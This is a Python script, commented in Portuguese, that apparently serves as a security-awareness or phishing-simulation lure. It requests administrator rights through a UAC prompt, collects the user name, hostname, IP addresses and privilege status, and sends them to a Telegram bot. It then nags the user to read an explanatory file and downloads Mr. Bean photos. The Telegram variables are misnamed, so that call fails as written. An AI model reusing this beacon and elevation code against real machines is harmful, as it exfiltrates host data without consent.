import os
import sys
import socket
import requests
import ctypes
import psutil
from tkinter import messagebox, Tk

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

# URLs das imagens para download
IMAGENS_URLS = [
    "https://media.gettyimages.com/id/73510827/pt/foto/sydney-australia-actor-rowan-atkinson-in-character-as-mr-bean-arrives-at-bondi-beach-to-promote.jpg?s=2048x2048&w=gi&k=20&c=dBcTrnILv7HSLoHSIEbHnK7n5IBXOGjf_jFCPXEwR2Y=",
    "https://media.gettyimages.com/id/115834408/pt/foto/rowan-atkinson-as-mr-bean-during-mr-beans-holiday-berlin-photocall-at-adlon-hotel-berlin-in.jpg?s=2048x2048&w=gi&k=20&c=doB92LyGDZ_ZYeM41AtDW2xCkwHJQXphEmkOUD7VXBY=",
    "https://media.gettyimages.com/id/1289390111/pt/foto/london-mr-bean-poses-with-red-nose-for-red-nose-day-1991-in-a-studio-on-15-march-1991-in-london.jpg?s=612x612&w=0&k=20&c=vJuBr9S8RW3s_Qfzjy3eFcKRPEu9nNC6ndDIiGJNjus=",
    "https://media.gettyimages.com/id/453882170/pt/foto/shanghai-china-actor-rowan-atkinson-as-mr-bean-performs-square-dance-during-a-programme.jpg?s=2048x2048&w=gi&k=20&c=U1QlFYIFy0HCuEUQTIlj8G4uEkHC3yu9Ok3mBK9sTCg=",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQExSRb5DItNPmz6Jq3HiQtf2-4c2on1GFyug&sg"
]

def obter_detalhes_sistema():
    """
    Coleta detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema = f"{os.name} ({sys.platform})"
        ips = [addr.address for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == socket.AF_INET]
        privilegios = "Concedidos ✅" if verificar_admin() else "Não Concedidos ❌"
        detalhes = (
            f"=== DETALHES DO SISTEMA ===\n"
            f"👤 Usuário: {usuario}\n"
            f"💻 Host: {hostname}\n"
            f"🌐 IPs: {' | '.join(ips)}\n"
            f"🖥️ Sistema Operacional: {sistema}\n"
            f"🔐 Privilégios Administrativos: {privilegios}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"

def enviar_alerta_arquivo(nome_arquivo):
    """
    Envia alerta ao Telegram sobre a execução do arquivo.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = obter_detalhes_sistema()
    mensagem = (
        f"🟡 <b>ALERTA MODERADO: Downloader '{nome_arquivo}' foi ativado!</b>\n"
        f"📂 <b>Localização:</b> {pasta_atual}\n"
        f"{detalhes_sistema}"
    )
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except Exception as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}")

def verificar_admin():
    """
    Verifica se o script está sendo executado como administrador.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Erro ao verificar privilégios: {e}")
        return False

def escalar_privilegios():
    """
    Escala privilégios para administrador caso necessário.
    """
    if not verificar_admin():
        print("Tentando escalar privilégios...")
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            os._exit(0)  # Saída limpa após escalar privilégios
        except Exception as e:
            print(f"Erro ao tentar escalar privilégios: {e}")
            os._exit(1)

def exibir_popup(txt_correspondente):
    """
    Exibe um pop-up perguntando se o arquivo explicativo foi lido.
    """
    root = Tk()
    root.withdraw()

    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{txt_correspondente}'?\n\n"
            "Por favor, leia antes de continuar."
        )

        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        else:
            messagebox.showwarning("Leitura Necessária", "Por favor, leia o arquivo antes de continuar.")

def baixar_imagens():
    """
    Faz o download de imagens das URLs para a pasta 'imagens'.
    """
    pasta_imagens = os.path.join(os.getcwd(), "imagens")
    os.makedirs(pasta_imagens, exist_ok=True)

    for index, url in enumerate(IMAGENS_URLS, start=1):
        try:
            print(f"Baixando imagem {index}: {url}")
            resposta = requests.get(url, stream=True)
            if resposta.status_code == 200:
                caminho_arquivo = os.path.join(pasta_imagens, f"imagem_{index}.jpg")
                with open(caminho_arquivo, "wb") as arquivo:
                    arquivo.write(resposta.content)
                print(f"Imagem {index} salva em {caminho_arquivo}.")
            else:
                print(f"Falha ao baixar imagem {index}: Status {resposta.status_code}")
        except Exception as e:
            print(f"Erro ao baixar imagem {index}: {e}")

if __name__ == "__main__":
    escalar_privilegios()

    nome_arquivo = os.path.basename(sys.argv[0])
    enviar_alerta_arquivo(nome_arquivo)

    txt_correspondente = f"{os.path.splitext(nome_arquivo)[0]}.txt"
    if exibir_popup(txt_correspondente):
        print("Processo confirmado pelo usuário.")
        baixar_imagens()
